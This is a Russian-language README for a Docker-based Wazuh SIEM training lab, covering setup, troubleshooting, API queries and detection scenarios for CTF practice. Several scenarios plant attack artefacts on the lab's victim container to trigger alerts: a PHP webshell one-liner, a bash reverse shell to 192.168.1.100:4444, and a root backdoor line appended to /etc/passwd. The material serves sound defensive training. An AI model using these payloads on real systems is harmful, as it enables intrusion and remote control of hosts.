# 🛡️ KKS Wazuh SIEM Lab

<div align="center">

![Wazuh Version](https://img.shields.io/badge/Wazuh-4.9.0-blue)
![OpenSearch Version](https://img.shields.io/badge/OpenSearch-2.13.0-green)
![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Docker](https://img.shields.io/badge/Docker-Required-2496ED?logo=docker)
![Platform](https://img.shields.io/badge/platform-Linux-orange)

**Полнофункциональная SIEM-платформа на базе Wazuh для мониторинга безопасности, threat hunting и CTF-соревнований.**

[Быстрый старт](#-быстрый-старт) • [Документация](#-содержание) • [CTF Сценарии](#-ctf-сценарии) • [Troubleshooting](#-troubleshooting)

</div>

---

## 📋 Содержание

- [О проекте](#-о-проекте)
- [Возможности](#-возможности)
- [Архитектура](#️-архитектура)
- [Требования](#-требования)
- [Быстрый старт](#-быстрый-старт)
- [Конфигурация](#️-конфигурация)
- [Использование](#-использование)
- [CTF Сценарии](#-ctf-сценарии)
- [Troubleshooting](#-troubleshooting)
- [API Reference](#-api-reference)
- [Contributing](#-contributing)
- [Лицензия](#-лицензия)

---

## 🎯 О проекте

**KKS Wazuh SIEM Lab** — это готовая к развертыванию SIEM-платформа на основе Wazuh, оптимизированная для:

- 🎓 **Обучения информационной безопасности** — изучение работы SIEM, правил корреляции, threat hunting
- 🏆 **CTF соревнований** — готовые сценарии для Attack-Defense формата
- 🔬 **Security исследований** — sandbox для тестирования exploit'ов и malware
- 🛠️ **DevSecOps практики** — интеграция security monitoring в CI/CD

### Особенности

- ⚡ **Развертывание за 5 минут** — автоматический setup.sh генерирует всё необходимое
- 🔒 **Production-ready security** — SSL сертификаты, пароли, basic auth генерируются автоматически
- 🐳 **Docker-based** — полная изоляция, легкое масштабирование
- 📊 **Pre-configured dashboards** — готовые визуализации для security events
- 🎯 **Victim node included** — Ubuntu 22.04 с предустановленным Wazuh Agent для CTF

---

## ✨ Возможности

### 🛡️ Security Monitoring

| Модуль | Описание | Use Cases |
|--------|----------|-----------|
| **File Integrity Monitoring** | Отслеживание изменений в `/etc`, `/bin`, `/sbin` | Детект backdoors, unauthorized changes |
| **Security Configuration Assessment** | CIS Benchmark проверки для Ubuntu 22.04 | Compliance auditing, hardening validation |
| **Log Analysis** | Парсинг syslog, auth.log, application logs | Correlation analysis, threat hunting |
| **Vulnerability Detection** | CVE сканирование установленных пакетов | Patch management, risk assessment |
| **Rootkit Detection** | Поиск скрытых процессов и файлов | Malware detection, forensics |

### 🚨 Threat Detection

- ✅ **Brute-force attacks** — SSH, FTP, RDP login attempts
- ✅ **Privilege escalation** — sudo, setuid exploits
- ✅ **Web attacks** — SQL injection, XSS, LFI
- ✅ **Network reconnaissance** — port scanning, ARP spoofing
- ✅ **Malware execution** — suspicious process creation

### 🎮 CTF Features

- 🎯 **Pre-configured victim node** — Ubuntu 22.04 с уязвимостями для тренировок
- 📊 **Real-time alerting** — мгновенные уведомления о атаках
- 🗺️ **MITRE ATT&CK mapping** — классификация событий по тактикам и техникам
- 📈 **Centralized logging** — все события в одном месте
- 🔍 **Advanced search** — OpenSearch DSL для threat hunting

---

## 🏗️ Архитектура

                                ┌─────────────────────┐
                                │   External Users    │
                                │   (HTTPS:443)       │
                                └──────────┬──────────┘
                                           │
                                           ▼
                          ┌────────────────────────────────┐
                          │         Nginx Proxy            │
                          │  - HTTPS Termination           │
                          │  - Basic Authentication        │
                          │  - Reverse Proxy               │
                          └───────────┬────────────────────┘
                                      │
                 ┌────────────────────┼────────────────────┐
                 │                    │                    │
                 ▼                    ▼                    ▼
      ┌──────────────────┐ ┌──────────────────┐ ┌──────────────────┐
      │ Wazuh Dashboard  │ │  Wazuh Manager   │ │ OpenSearch API   │
      │   (Port 5601)    │ │  (Port 55000)    │ │  (Port 9200)     │
      │                  │ │                  │ │                  │
      │ - Web UI         │ │ - Rules Engine   │ │ - Data Storage   │
      │ - Visualizations │ │ - Correlation    │ │ - Full-text      │
      │ - Reports        │ │ - API Server     │ │   Search         │
      └──────────────────┘ └─────────┬────────┘ └──────────────────┘
                                      │
                                      │ Events (TCP 1514)
                                      │ Enrollment (TCP 1515)
                                      │
                 ┌────────────────────┼────────────────────┐
                 │                    │                    │
                 ▼                    ▼                    ▼
      ┌──────────────────┐ ┌──────────────────┐ ┌──────────────────┐
      │   Victim Node    │ │   Agent Node 2   │ │   Agent Node N   │
      │  (Ubuntu 22.04)  │ │    (Optional)    │ │    (Optional)    │
      │                  │ │                  │ │                  │
      │ - Wazuh Agent    │ │ - Wazuh Agent    │ │ - Wazuh Agent    │
      │ - FIM            │ │ - Log Collector  │ │ - Custom Rules   │
      │ - Log Collector  │ │ - SCA Module     │ │                  │
      │ - SCA Module     │ │                  │ │                  │
      └──────────────────┘ └──────────────────┘ └──────────────────┘


### 📦 Компоненты

| Сервис | Образ | Роль | Порты |
|--------|-------|------|-------|
| **Wazuh Manager** | `wazuh/wazuh-manager:4.9.0` | SIEM движок, обработка правил, correlation | 1514, 1515, 55000 |
| **Wazuh Indexer** | `wazuh/wazuh-indexer:4.9.0` | Storage backend (OpenSearch) | 9200 |
| **Wazuh Dashboard** | `wazuh/wazuh-dashboard:4.9.0` | Web UI для аналитики | 5601 |
| **Nginx** | `nginx:latest` | Reverse proxy, HTTPS, basic auth | 443 |
| **Victim Node** | `ubuntu:22.04` + Wazuh Agent | Защищаемый хост с агентом | - |
| **Logstash** | `opensearch-logstash:8.9.0` | Альтернативный event pipeline (опционально) | 9600 |

---

## 📦 Требования

### Минимальные требования

| Компонент | Минимум | Рекомендуется |
|-----------|---------|---------------|
| **OS** | Ubuntu 20.04+ / Debian 11+ / RHEL 8+ / Kali Linux | Ubuntu 22.04 LTS |
| **RAM** | 8 GB | 16 GB |
| **CPU** | 4 cores | 8 cores |
| **Disk** | 50 GB | 100 GB (SSD) |
| **Docker** | 20.10+ | Latest stable |
| **Docker Compose** | 2.0+ | Latest stable |

### Проверка системы

RAM

free -h | grep Mem
Должно быть: Mem: 15Gi или больше
CPU

nproc
Должно быть: 4 или больше
Disk

df -h /
Должно быть: 50G+ свободного места
Docker

docker --version
Должно быть: Docker version 20.10.0+
Docker Compose

docker-compose --version
Должно быть: Docker Compose version 2.0.0+


### Установка зависимостей

<details>
<summary><b>Ubuntu/Debian</b></summary>

Обновление пакетов

sudo apt update && sudo apt upgrade -y
Установка Docker

sudo apt install -y docker.io docker-compose git apache2-utils curl
Добавление пользователя в группу docker

sudo usermod -aG docker $USER
Применение изменений (или перелогинься)

newgrp docker
Проверка

docker ps

</details>

<details>
<summary><b>RHEL/CentOS/Fedora</b></summary>

Установка Docker

sudo yum install -y docker docker-compose git httpd-tools curl
Запуск Docker

sudo systemctl enable --now docker
Добавление пользователя в группу

sudo usermod -aG docker $USER
Применение изменений

newgrp docker

</details>

<details>
<summary><b>Kali Linux</b></summary>

Docker уже установлен, обнови compose

sudo apt update
sudo apt install -y docker-compose git apache2-utils
Добавь пользователя

sudo usermod -aG docker $USER
newgrp docker

</details>

---

## 🚀 Быстрый старт

### Видео-демо

<div align="center">

[![Setup Demo](https://img.shields.io/badge/▶️-Watch_Demo-red?style=for-the-badge&logo=youtube)](https://github.com/kanabicks/kks-wazuh-siem)

*Полное развертывание за 5 минут*

</div>

### Автоматическая установка

1️⃣ Клонируем репозиторий

git clone https://github.com/kanabicks/kks-wazuh-siem.git
cd kks-wazuh-siem
2️⃣ Запускаем setup-скрипт

chmod +x setup.sh
./setup.sh
3️⃣ Ждём инициализации (2-3 минуты)
Скрипт автоматически:
✅ Проверит системные требования
✅ Установит недостающие пакеты (htpasswd, openssl)
✅ Сгенерирует SSL сертификаты
✅ Создаст случайные пароли в .env
✅ Настроит Nginx Basic Auth
✅ Запустит все контейнеры
✅ Выведет credentials для доступа
4️⃣ Доступ к интерфейсу
URL: https://localhost:443
Credentials будут показаны в конце setup.sh

### Что делает setup.sh?

╔═══════════════════════════════════════════╗
║ 🛡️ KKS Wazuh SIEM Setup Script ║
║ Automated deployment for CTF & SecOps ║
╚═══════════════════════════════════════════╝

[i] Step 1/7: Checking system requirements...
[✓] RAM: 15GB
[✓] CPU: 8 cores
[✓] Disk space: 120GB
[✓] Docker: 24.0.7
[✓] Docker Compose: 2.21.0

[i] Step 2/7: Installing required tools...
[✓] All tools already installed

[i] Step 3/7: Generating secure passwords...
[✓] Passwords generated and saved to .env

[i] Step 4/7: Configuring Nginx authentication...
[i] Create Nginx Basic Auth credentials for web access
Username [admin]: admin
New password: ****
Re-type new password: ****
[✓] Nginx credentials created

[i] Step 5/7: Generating SSL certificates...
[i] Generating Root CA...
[i] Generating Admin certificate...
[i] Generating Indexer certificate...
[i] Generating Manager certificate...
[i] Generating Dashboard certificate...
[✓] SSL certificates generated in ./certs/

[i] Step 6/7: Starting Wazuh SIEM stack...
[i] Pulling Docker images (this may take a few minutes)...
[i] Starting containers...
[✓] Containers started

[i] Step 7/7: Waiting for services to initialize...
[i] This may take 2-3 minutes. Please wait...
..........................................
[✓] Wazuh Indexer is ready
[✓] Wazuh Manager is running

╔═══════════════════════════════════════════════════╗
║ ✅ Wazuh SIEM Setup Complete! ║
╚═══════════════════════════════════════════════════╝

[✓] Access Information:

🌐 Wazuh Dashboard:
URL: https://localhost:443
Username: admin
Password: <your htpasswd password>

🔐 Dashboard Login (after basic auth):
Username: admin
Password: Xy8kRnQw3mTp4vL2zB9dK6fN7

📊 OpenSearch API:
URL: http://localhost:9200

🔍 Wazuh API:
URL: https://localhost:55000

[i] Useful commands:
docker-compose logs -f # View all logs
docker-compose ps # Check status
docker-compose restart wazuh.manager # Restart service
docker-compose down # Stop all services

🎉 Happy hunting!

---

## ⚙️ Конфигурация

### Структура проекта

kks-wazuh-siem/
├── 📄 README.md # Документация
├── 🔧 docker-compose.yml # Оркестрация сервисов
├── 🔑 .env.example # Шаблон переменных окружения
├── 🚀 setup.sh # Автоматический setup
├── 📝 LICENSE # MIT License
├── 🚫 .gitignore # Git exclusions
│
├── 📁 certs/ # SSL сертификаты (генерируются)
│ ├── .gitkeep
│ ├── root-ca.pem # Root CA (после setup.sh)
│ ├── admin.pem # Admin cert
│ ├── wazuh.indexer.pem # Indexer cert
│ ├── wazuh.manager.pem # Manager cert
│ └── wazuh.dashboard.pem # Dashboard cert
│
├── 📁 nginx_conf/ # Nginx конфигурация
│ ├── default.conf # Reverse proxy rules
│ ├── .htpasswd.example # Пример basic auth
│ └── .htpasswd # Сгенерированный (после setup)
│
├── 📁 sensor/ # Victim node
│ ├── Dockerfile # Ubuntu 22.04 + Wazuh Agent
│ └── entrypoint.sh # Auto-enrollment script
│
├── 📁 logstash/ # Logstash pipeline (опционально)
│ └── pipeline/
│ └── wazuh.conf # Input/output конфигурация
│
├── 🐳 Dockerfile.indexer # Wazuh Indexer (без security plugin)
├── 🐳 Dockerfile.dashboard # Wazuh Dashboard
├── 📝 wazuh.yml.example # Пример конфига Manager
└── 📝 wazuh.yml # Активная конфигурация (после setup)


### Переменные окружения (.env)

После запуска `setup.sh` создается `.env` файл:


Версии компонентов

WAZUH_VERSION=4.9.0
OPENSEARCH_VERSION=2.13.0
LOGSTASH_VERSION=8.9.0
Пароли (генерируются автоматически)

WAZUH_ADMIN_PASSWORD=Xy8kRnQw3mTp4vL2zB9dK6fN7
INDEXER_PASSWORD=Qp5mZx9wKt3rY7bN2vL8dF4gH6
DASHBOARD_PASSWORD=Mn4tRx7wQp2yL9kN5vB8dC3fG1
API_PASSWORD=Zt6kMx3wRp8yL2bN9vD7fC5gH4
Nginx Basic Auth

NGINX_USER=admin
NGINX_PASS=<htpasswd hash>
Network configuration

MANAGER_IP=172.18.0.5
INDEXER_IP=172.18.0.3
DASHBOARD_IP=172.18.0.4


### Кастомизация конфигурации

<details>
<summary><b>Изменение паролей вручную</b></summary>


1. Отредактируй .env

nano .env
2. Пересоздай контейнеры

docker-compose down
docker-compose up -d

</details>

<details>
<summary><b>Добавление кастомных правил Wazuh</b></summary>

1. Войди в контейнер Manager

docker-compose exec wazuh.manager bash
2. Создай локальные правила

vi /var/ossec/etc/rules/local_rules.xml
Пример:
<group name="custom_rules"> <rule id="100001" level="10"> <if_sid>5710</if_sid> <match>Failed password</match> <description>Custom: SSH brute-force detected</description> <group>authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,</group> </rule> </group>
3. Перезапусти Manager

/var/ossec/bin/wazuh-control restart

</details>

<details>
<summary><b>Настройка FIM для дополнительных директорий</b></summary>

1. Отредактируй конфиг на Manager

docker-compose exec wazuh.manager vi /var/ossec/etc/ossec.conf
2. Добавь директорию в секцию <syscheck>

<directories check_all="yes" realtime="yes">/var/www/html</directories>
3. Примени изменения

docker-compose exec wazuh.manager /var/ossec/bin/wazuh-control restart

</details>

---

## 🎮 Использование

### Доступ к интерфейсам

| Интерфейс | URL | Credentials |
|-----------|-----|-------------|
| **Wazuh Dashboard** | https://localhost:443 | Basic Auth + admin:password (из .env) |
| **OpenSearch API** | http://localhost:9200 | No auth (security disabled) |
| **Wazuh API** | https://localhost:55000 | wazuh-wui:wazuh-wui |
| **Logstash** | http://localhost:9600 | No auth |

### Мониторинг сервисов

Статус всех контейнеров

docker-compose ps
Логи всех сервисов

docker-compose logs -f
Логи конкретного сервиса

docker-compose logs -f wazuh.manager
docker-compose logs -f wazuh.indexer --tail=100
Потребление ресурсов

docker stats
Рестарт сервиса

docker-compose restart wazuh.manager
Остановка всей системы

docker-compose down
Удаление с очисткой volumes

docker-compose down -v


### Работа с агентами

Список всех агентов

docker-compose exec wazuh.manager /var/ossec/bin/agent_control -l
Информация о конкретном агенте

docker-compose exec wazuh.manager /var/ossec/bin/agent_control -i 001
Статус подключения

docker-compose exec wazuh.manager /var/ossec/bin/agent_control -s
Регистрация нового агента вручную

docker-compose exec wazuh.manager /var/ossec/bin/manage_agents
Рестарт агента

docker-compose exec wazuh.manager /var/ossec/bin/agent_control -R 001


### Просмотр алертов


Real-time JSON алерты

docker-compose exec wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json
Последние 50 алертов (formatted)

docker-compose exec wazuh.manager tail -50 /var/ossec/logs/alerts/alerts.log
Поиск по типу алерта через OpenSearch

curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"match": {
"rule.description": "authentication failed"
}
},
"size": 10
}'
Статистика по алертам за сегодня

curl -s http://localhost:9200/wazuh-alerts-$(date +%Y.%m.%d)/_count?pretty


---

## 🎯 CTF Сценарии

### Сценарий 1: SSH Brute-Force Attack

**Цель:** Научиться детектировать попытки brute-force атак на SSH.

1️⃣ Войди в victim node

docker-compose exec victim-node bash
2️⃣ Симулируй failed login attempts

for i in {1..15}; do
logger -p auth.warning "sshd: Failed password for invalid user hacker from 192.168.1.100 port 22 ssh2"
sleep 1
done
3️⃣ Проверь алерты в Dashboard
URL: https://localhost:443
Security events → Filter: rule.description: "authentication failed"
4️⃣ Или через API

sleep 20
curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"must": [
{"match": {"rule.groups": "authentication_failed"}},
{"range": {"timestamp": {"gte": "now-5m"}}}
]
}
},
"size": 5,
"sort": [{"timestamp": "desc"}]
}'



**Ожидаемый результат:**
- ✅ Alert Level 10: "sshd: authentication failed"
- ✅ Rule ID: 5710
- ✅ MITRE Tactic: Credential Access (T1110)

---

### Сценарий 2: File Integrity Monitoring (FIM)

**Цель:** Детектирование изменений критических файлов.



1️⃣ Проверь текущие мониторимые директории

docker-compose exec victim-node cat /var/ossec/etc/ossec.conf | grep -A 5 "<directories"
2️⃣ Измени критический файл

docker-compose exec victim-node bash -c 'echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd'
3️⃣ Форсируй FIM scan (или жди 12 часов)

docker-compose exec victim-node /var/ossec/bin/wazuh-control restart
4️⃣ Через 30 секунд проверь алерты

sleep 30
curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"must": [
{"match": {"syscheck.path": "/etc/passwd"}},
{"match": {"syscheck.event": "modified"}}
]
}
},
"size": 1
}'



**Ожидаемый результат:**
- ✅ Alert Level 7: "Integrity checksum changed"
- ✅ Rule ID: 550
- ✅ Changed fields: size, md5, sha1, sha256

---

### Сценарий 3: Malware Detection (Webshell)

**Цель:** Обнаружение подозрительных файлов.

1️⃣ Создай PHP webshell

docker-compose exec victim-node bash -c 'mkdir -p /tmp/webroot && echo "<?php system(\$_GET[\"cmd\"]); ?>" > /tmp/webroot/shell.php'
2️⃣ Создай reverse shell script

docker-compose exec victim-node bash -c 'echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh'
3️⃣ Симулируй execution

docker-compose exec victim-node bash -c 'logger -p local7.info "www-data: Executed: php /tmp/webroot/shell.php?cmd=whoami"'
4️⃣ Проверь алерты

sleep 15
curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"should": [
{"match": {"data.file": "shell.php"}},
{"match": {"data.file": "backdoor.sh"}}
]
}
},
"size": 5
}'



**Ожидаемый результат:**
- ✅ FIM alert для новых файлов
- ✅ Suspicious filename patterns detected

---

### Сценарий 4: Privilege Escalation

**Цель:** Детектирование попыток повышения привилегий.

1️⃣ Симулируй sudo попытки

docker-compose exec victim-node bash -c '
for user in "attacker" "hacker" "user"; do
logger -p auth.info "sudo: $user : TTY=pts/0 ; PWD=/home/$user ; USER=root ; COMMAND=/bin/bash"
sleep 2
done
'
2️⃣ Симулируй SUID exploit попытку

docker-compose exec victim-node bash -c 'logger -p syslog.warning "kernel: [12345.67] SUID exploit attempt detected from PID 1337"'
3️⃣ Проверь MITRE ATT&CK mapping

curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"match": {
"rule.mitre.tactic": "Privilege Escalation"
}
},
"size": 5,
"sort": [{"timestamp": "desc"}]
}'




**Ожидаемый результат:**
- ✅ Alert Level 10: "Sudo: User executed command"
- ✅ MITRE Tactic: Privilege Escalation
- ✅ MITRE Technique: T1548 (Abuse Elevation Control Mechanism)

---

### Сценарий 5: CIS Compliance Audit

**Цель:** Проверка compliance с CIS Benchmark.



1️⃣ Запусти SCA scan вручную

docker-compose exec victim-node /var/ossec/bin/wazuh-control restart
2️⃣ Дождись завершения scan (~2 минуты)

sleep 120
3️⃣ Проверь результаты через API

curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"must": [
{"match": {"data.sca.policy": "CIS Ubuntu"}},
{"match": {"data.sca.check.result": "failed"}}
]
}
},
"size": 10
}'
4️⃣ Посмотри failed checks в Dashboard
Security events → Security Configuration Assessment
Filter: Policy ID: cis_ubuntu22-04



**Ожидаемые проверки:**
- ✅ Password policies (complexity, expiration)
- ✅ File permissions (`/etc/passwd`, `/etc/shadow`)
- ✅ Audit configuration
- ✅ SSH hardening
- ✅ sudo configuration

---

### Сценарий 6: Network Reconnaissance

**Цель:** Детектирование сканирования портов.

1️⃣ Симулируй nmap scan

docker-compose exec victim-node bash -c '
for port in {20..25} {80..85} {443..445}; do
logger -p kern.warning "iptables: DENY IN=eth0 SRC=192.168.1.100 DST=172.18.0.2 PROTO=TCP SPT=54321 DPT=$port"
sleep 0.1
done
'
2️⃣ Симулируй ARP spoofing

docker-compose exec victim-node bash -c 'logger -p kern.alert "arpwatch: duplicate IP address 192.168.1.1 detected from 00:11:22:33:44:55"'
3️⃣ Проверь network-related алерты

curl -s http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"should": [
{"match": {"rule.groups": "recon"}},
{"match": {"rule.description": "port scan"}}
]
}
},
"size": 5
}'


---

## 🔧 Troubleshooting

### ❌ Проблема: Permission denied в wazuh.manager

**Симптомы:**


s6-chmod: fatal: unable to change mode: Operation not permitted
wazuh-manager container keeps restarting


**Решение:**

Проверь privileged mode в docker-compose.yml

grep -A 3 "wazuh.manager:" docker-compose.yml | grep privileged
Должно быть:
privileged: true
Если отсутствует - добавь и пересоздай

docker-compose down
docker-compose up -d wazuh.manager


---

### ❌ Проблема: Connection refused к wazuh.indexer:9200

**Симптомы:**


ConnectionError: connect ECONNREFUSED 172.18.0.3:9200
Dashboard shows "Unable to connect to Indexer"


**Решение:**

1. Проверь статус indexer

docker-compose ps wazuh.indexer
2. Проверь логи

docker-compose logs wazuh.indexer | tail -50
3. Дождись полной инициализации (2-3 минуты)

docker-compose logs wazuh.indexer | grep -i "started"
4. Проверь health через curl

curl -s http://localhost:9200/_cluster/health?pretty
5. Если не помогло - пересоздай контейнер

docker-compose restart wazuh.indexer
6. В крайнем случае - rebuild image

docker-compose down
docker-compose build --no-cache wazuh.indexer
docker-compose up -d


---

### ❌ Проблема: Агент не подключается к Manager

**Симптомы:**

ERROR: Unable to connect to enrollment service at wazuh.manager:1515
Agent status: Never connected


**Решение:**

1. Проверь сетевую связность

docker-compose exec victim-node ping -c 3 wazuh.manager
2. Проверь порты на Manager

docker-compose exec wazuh.manager netstat -tulnp | grep -E "1514|1515"
Должно быть:
tcp 0.0.0.0:1514 LISTEN
tcp 0.0.0.0:1515 LISTEN
3. Проверь ключи агента

docker-compose exec victim-node cat /var/ossec/etc/client.keys
4. Перерегистрируй агента

docker-compose restart victim-node
5. Проверь логи Manager

docker-compose logs wazuh.manager | grep -i "agent.*connected"
6. Если не помогло - удали и пересоздай агента

docker-compose exec wazuh.manager /var/ossec/bin/manage_agents
(Выбери опцию: Remove agent)

docker-compose restart victim-node


---

### ❌ Проблема: Nginx 502 Bad Gateway

**Симптомы:**

502 Bad Gateway при доступе к https://localhost:443
Dashboard unreachable


**Решение:**

1. Проверь статус Dashboard

docker-compose ps wazuh.dashboard
2. Проверь логи Dashboard

docker-compose logs wazuh.dashboard | tail -100
3. Проверь connectivity между nginx и dashboard

docker-compose exec nginx ping -c 3 wazuh.dashboard
4. Проверь конфигурацию nginx

docker-compose exec nginx nginx -t
5. Рестарт сервисов

docker-compose restart wazuh.dashboard nginx
6. Проверь что Dashboard слушает на 5601

docker-compose exec wazuh.dashboard netstat -tulnp | grep 5601



---

### ❌ Проблема: Высокое потребление RAM/CPU

**Симптомы:**


System slow, high memory usage
Docker stats показывает 90%+ RAM



**Решение:**


1. Проверь потребление ресурсов

docker stats --no-stream
2. Уменьши heap size для Indexer
Отредактируй docker-compose.yml:
OPENSEARCH_JAVA_OPTS: "-Xms256m -Xmx256m" # Вместо 512m

docker-compose down
docker-compose up -d
3. Настрой retention policy (удаляй старые индексы)

curl -X PUT "http://localhost:9200/_ilm/policy/wazuh-alerts-retention" -H 'Content-Type: application/json' -d '
{
"policy": {
"phases": {
"hot": {
"min_age": "0ms",
"actions": {}
},
"delete": {
"min_age": "7d",
"actions": {
"delete": {}
}
}
}
}
}'
4. Удали старые индексы вручную

curl -X DELETE "http://localhost:9200/wazuh-alerts-2025.12.0*"
5. Увеличь FIM scan interval (с 12h до 24h)

docker-compose exec wazuh.manager vi /var/ossec/etc/ossec.conf
Найди <frequency> и измени на 86400 (24 hours)

docker-compose exec wazuh.manager /var/ossec/bin/wazuh-control restart



---

### ❌ Проблема: Disk space заканчивается

**Симптомы:**


df -h показывает 90%+ использования
Indexer падает с "no space left on device"



**Решение:**

1. Проверь использование Docker

docker system df -v
2. Очисти неиспользуемые образы/контейнеры

docker system prune -af --volumes
3. Удали старые индексы

curl -X GET "http://localhost:9200/_cat/indices?v"
curl -X DELETE "http://localhost:9200/wazuh-alerts-2025.11.*"
4. Настрой log rotation на Manager

docker-compose exec wazuh.manager vi /var/ossec/etc/ossec.conf
Добавь/измени:
<logrotation>7d</logrotation>
5. Очисти логи вручную

docker-compose exec wazuh.manager rm -f /var/ossec/logs/alerts/alerts.log.*
docker-compose exec wazuh.manager rm -f /var/ossec/logs/ossec.log.*
6. Ограничь размер Docker logging
Добавь в docker-compose.yml для каждого сервиса:
logging:
driver: "json-file"
options:
max-size: "10m"
max-file: "3"



---

### ❌ Проблема: Cannot login to Dashboard

**Симптомы:**

Invalid username or password
Authentication failed


**Решение:**


1. Проверь пароли в .env

cat .env | grep PASSWORD
2. Проверь Nginx basic auth

cat nginx_conf/.htpasswd
3. Пересоздай htpasswd

htpasswd -c nginx_conf/.htpasswd admin
Введи новый пароль

docker-compose restart nginx
4. Проверь Dashboard credentials
Username: admin
Password: из .env (DASHBOARD_PASSWORD)
5. Сбрось пароли (если забыл)

./setup.sh
Выбери "Overwrite .env" при запросе


---

## 📚 API Reference

### Wazuh API

Получение JWT токена

TOKEN=$(curl -k -u wazuh-wui:wazuh-wui -X POST
"https://localhost:55000/security/user/authenticate" |
jq -r '.data.token')
Список всех агентов

curl -k -H "Authorization: Bearer $TOKEN"
"https://localhost:55000/agents?pretty=true"
Информация о конкретном агенте

curl -k -H "Authorization: Bearer $TOKEN"
"https://localhost:55000/agents/001?pretty=true"
Рестарт агента

curl -k -H "Authorization: Bearer $TOKEN" -X PUT
"https://localhost:55000/agents/001/restart?pretty=true"
Статистика Manager

curl -k -H "Authorization: Bearer $TOKEN"
"https://localhost:55000/manager/stats?pretty=true"
Список активных правил

curl -k -H "Authorization: Bearer $TOKEN"
"https://localhost:55000/rules?pretty=true&limit=10"
Health check

curl -k -H "Authorization: Bearer $TOKEN"
"https://localhost:55000/?pretty=true"


### OpenSearch API

Все индексы

curl http://localhost:9200/_cat/indices?v
Mapping индекса

curl http://localhost:9200/wazuh-alerts-*/_mapping?pretty
Count документов

curl http://localhost:9200/wazuh-alerts-$(date +%Y.%m.%d)/_count?pretty
Поиск алертов

curl http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"query": {
"bool": {
"must": [
{"range": {"rule.level": {"gte": 10}}},
{"range": {"timestamp": {"gte": "now-1h"}}}
]
}
},
"size": 100,
"sort": [{"timestamp": "desc"}]
}'
Aggregations (Top 10 правил)

curl http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"size": 0,
"aggs": {
"top_rules": {
"terms": {
"field": "rule.id",
"size": 10
}
}
}
}'
Top источников атак

curl http://localhost:9200/wazuh-alerts-*/_search?pretty -H 'Content-Type: application/json' -d '
{
"size": 0,
"aggs": {
"top_sources": {
"terms": {
"field": "data.srcip",
"size": 10
}
}
}
}'


---

## 🛠️ Полезные команды

### Docker управление


Остановка всех сервисов

docker-compose down
Полная очистка (включая volumes и данные)

docker-compose down -v
Перезапуск конкретного сервиса

docker-compose restart wazuh.manager
Пересборка образов

docker-compose build --no-cache
Просмотр логов

docker-compose logs -f # Все сервисы
docker-compose logs -f wazuh.manager # Конкретный сервис
docker-compose logs --tail=100 wazuh.indexer # Последние 100 строк
Вход в контейнер

docker-compose exec wazuh.manager bash
docker-compose exec victim-node bash
Проверка ресурсов

docker stats
Backup volumes

docker run --rm
-v kks-wazuh-siem_wazuh-manager-data:/data
-v $(pwd):/backup
ubuntu tar czf /backup/wazuh-backup-$(date +%Y%m%d).tar.gz /data
Restore backup

docker run --rm
-v kks-wazuh-siem_wazuh-manager-data:/data
-v $(pwd):/backup
ubuntu tar xzf /backup/wazuh-backup-20251218.tar.gz -C /



### Wazuh Manager команды

Статус процессов

docker-compose exec wazuh.manager /var/ossec/bin/wazuh-control status
Рестарт Manager

docker-compose exec wazuh.manager /var/ossec/bin/wazuh-control restart
Проверка конфигурации

docker-compose exec wazuh.manager /var/ossec/bin/wazuh-logtest
Тестирование правила на событии

echo "Dec 18 16:42:21 victim sshd: Failed password for root from 192.168.1.100" |
docker-compose exec -T wazuh.manager /var/ossec/bin/wazuh-logtest
Просмотр активных подключений

docker-compose exec wazuh.manager netstat -anp | grep 1514
Информация о базе данных агентов

docker-compose exec wazuh.manager sqlite3 /var/ossec/queue/db/global.db "SELECT * FROM agent;"


---

## 🤝 Contributing

Мы приветствуем любой вклад в проект! 

### Как внести свой вклад:

1. 🍴 **Fork** репозиторий
2. 🌿 Создай feature branch (`git checkout -b feature/AmazingFeature`)
3. ✍️ Внеси изменения и закоммить (`git commit -m 'Add some AmazingFeature'`)
4. 📤 Push в branch (`git push origin feature/AmazingFeature`)
5. 🔀 Открой **Pull Request**

### Guidelines:

- ✅ Следуй существующему code style
- ✅ Добавляй комментарии для сложной логики
- ✅ Обновляй документацию при изменении функционала
- ✅ Тестируй изменения перед PR
- ✅ Один PR = одна feature/fix

### Что можно улучшить:

- 📝 Добавить больше CTF сценариев
- 🐳 Оптимизировать Docker образы
- 🔒 Добавить поддержку HTTPS для Indexer (с полным TLS)
- 📊 Создать Grafana dashboards
- 🤖 Интеграция с Telegram/Slack для алертов
- 🧪 Автоматические тесты (pytest, Docker testcontainers)
- 🌐 Перевод документации на английский

---

## 📄 Лицензия

Этот проект распространяется под лицензией **MIT License**.


MIT License

Copyright (c) 2025 KKS Security Lab

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
